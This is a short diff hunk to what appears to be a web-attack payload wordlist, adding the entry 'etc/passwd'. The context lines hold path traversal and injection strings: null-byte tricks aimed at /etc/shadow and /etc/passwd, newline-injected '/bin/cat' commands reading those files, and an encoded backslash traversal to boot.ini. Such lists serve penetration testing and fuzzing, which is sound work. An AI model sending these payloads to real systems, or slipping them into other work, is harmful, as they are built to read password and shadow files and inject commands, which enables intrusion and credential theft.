@@ -2,6 +2,7 @@
 %00../../../../../../etc/shadow
 %00/etc/passwd%00
 %00/etc/shadow%00
+etc/passwd
 %0a/bin/cat%20/etc/passwd
 %0a/bin/cat%20/etc/shadow
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
